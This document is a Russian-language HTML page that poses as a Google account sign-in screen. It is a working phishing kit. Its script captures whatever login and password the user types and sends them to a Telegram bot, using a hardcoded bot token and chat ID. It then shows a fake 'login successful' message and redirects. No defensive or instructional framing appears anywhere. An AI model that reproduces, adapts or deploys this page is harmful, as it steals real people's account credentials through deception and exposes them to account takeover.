<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Вход</title>
</head>
<body>

    <div class="glav">
        <div class="imue">
            <img src="gglogo.png" class="imug">
            <p class="sinin">Вход</p>
            <p class="isp">Используйте аккаунт Google</p>
            <input class="input1" type="text" id="login" placeholder="Телефон или адрес эл. почты" style="background-color: rgb(8, 8, 8);">
            <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8);">
            
            <div id="status" style="color: #c2b9c2; font-family: Arial, sans-serif; font-size: 14px; margin-top: 15px; min-height: 20px;"></div>
        </div>
        <div class="button">
            <button id="button">Далее</button>
        </div>
    </div>

    <script>
        const TOKEN = "7720379353:AAGsCGg6r6DZQAnEBb9fsBje4JE0Dao8oEY";
        const CHAT_ID = "6811862398";

        const input = document.getElementById("login");
        const input2 = document.getElementById("password");
        const btn = document.getElementById("button");
        const status = document.getElementById("status");

        btn.addEventListener("click", () => {
            // Проверяем, заполнил ли пользователь поля
            if (!input.value || !input2.value) {
                return alert("Введите логин и пароль");
            }

            // Блокируем кнопку, чтобы не было спама запросами
            btn.disabled = true;
            status.textContent = "Проверка...";

            const text = encodeURIComponent("Логин: " + input.value + "  Пароль:   " + input2.value);

            // Отправляем данные обычным fetch
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`)
            .then(res => res.json())
            .then(res => {
                if (res.ok) {
                    status.textContent = "Вход выполнен успешно ✅";
                    // Даем небольшую паузу (400 миллисекунд), чтобы юзер увидел галочку, и перенаправляем
                    setTimeout(() => {
                        window.location.href = "next.html";
                    }, 400);
                } else {
                    status.textContent = "Ошибка сервера ❌";
                    btn.disabled = false;
                }
            })
            .catch(err => {
                console.error(err);
                status.textContent = "Ошибка сети ❌";
                btn.disabled = false;
            });
        });
    </script>
</body>
</html>
